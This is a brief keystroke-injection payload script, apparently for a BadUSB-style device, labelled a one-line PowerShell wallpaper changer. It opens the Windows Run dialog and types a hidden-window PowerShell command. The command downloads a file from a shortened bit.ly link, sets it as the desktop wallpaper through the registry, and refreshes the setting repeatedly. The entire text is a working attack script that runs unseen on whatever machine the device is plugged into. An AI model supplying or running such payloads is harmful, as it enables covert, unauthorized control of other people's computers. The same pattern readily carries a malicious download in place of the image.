//One Line Powershell Wallpaper Changer
layout('us');
typingSpeed(0,0)
press("GUI r");
delay(500);
type(" powershell -w h \"$p=$home+'\\b.jpg';iwr https://bit.ly/2SrQzNT -O $p;SP 'HKCU:Control Panel\\Desktop' WallPaper $p;1..59|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}\"\n")
delay(1000);
